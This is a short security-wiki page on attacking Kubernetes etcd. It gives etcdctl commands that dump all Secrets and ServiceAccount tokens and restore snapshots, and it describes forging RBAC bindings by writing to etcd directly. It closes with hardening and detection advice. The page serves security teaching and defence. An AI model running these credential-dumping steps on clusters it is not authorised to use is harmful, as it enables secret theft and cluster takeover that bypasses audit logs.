---
title: etcd attacks
slug: k8s-etcd-attacks
---

> **TL;DR:** etcd is the cluster's source of truth — direct read = all Secrets in plaintext, direct write = forge any resource, including a kubelet-trusted ClusterRoleBinding.

## What it is
The Kubernetes API server treats etcd as a private datastore: every Secret, ConfigMap, ServiceAccount token, and RBAC binding lives there as a protobuf-encoded record. The only gate is mutual TLS — etcd listens on 2379/2380 and only accepts clients presenting a cert signed by the etcd CA. Misconfigurations (etcd exposed on a node interface without `--client-cert-auth`, weak network policy on control-plane subnets, backups copied off-host without re-encryption, or a peer cert that also works as a client cert) turn etcd into a direct cluster-takeover surface that bypasses every audit log and admission webhook.

## Preconditions / where it applies
- Network reachability to an etcd member on 2379 from a node, container with hostNetwork, or compromised control-plane host.
- etcd not enforcing client cert auth, or attacker holds a valid etcd client cert / has read on a backup snapshot.
- Encryption-at-rest for Secrets not configured (still default off in many distributions).

## Technique
1. Reach an etcd endpoint and prove auth with a stolen or absent client cert.
2. Dump Secrets and ServiceAccount tokens.
3. Optionally inject a ClusterRoleBinding directly or restore a tampered snapshot.

```bash
# From a control-plane host (auth via static manifest certs)
export ETCDCTL_API=3
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
  get / --prefix --keys-only | head
```

```bash
# Pull every Secret as raw bytes — protobuf, parseable with `auger`
etcdctl --endpoints=... get /registry/secrets --prefix --print-value-only \
  | auger decode | grep -A2 -B1 token
```

```bash
# Backup-side: snapshot file is the whole DB
etcdctl snapshot restore snap.db --data-dir=./restored
# then run a sidecar etcd against ./restored and read normally
```

Writing directly to `/registry/clusterrolebindings/...` creates an RBAC binding that admission controllers never see; the apiserver re-reads etcd and treats it as authoritative.

## Detection and defence
- Run etcd on a dedicated network, bind only to loopback or a control-plane VLAN, enforce `--client-cert-auth` and `--peer-client-cert-auth`.
- Enable Kubernetes Secrets encryption at rest (`EncryptionConfiguration`) — at minimum with `aescbc`, preferably a KMS provider so etcd-only access is insufficient.
- Audit + restrict access to snapshot files (`/var/lib/etcd`, backup buckets) — treat them like a SAM database.
- Network policy on managed offerings: most hosted control planes (GKE, EKS, AKS) hide etcd from tenants; on self-managed, segment ruthlessly.
- Related: [[k8s-rbac-abuse]], [[k8s-ingressnightmare]].

## References
- [Kubernetes — Operating etcd clusters for Kubernetes](https://kubernetes.io/docs/tasks/administer-cluster/configure-upgrade-etcd/) — canonical config and TLS guidance.
- [Kubernetes — Encrypting Secret Data at Rest](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/) — why raw etcd reads = plaintext by default.
- [auger](https://github.com/etcd-io/auger) — decode etcd-stored Kubernetes objects.
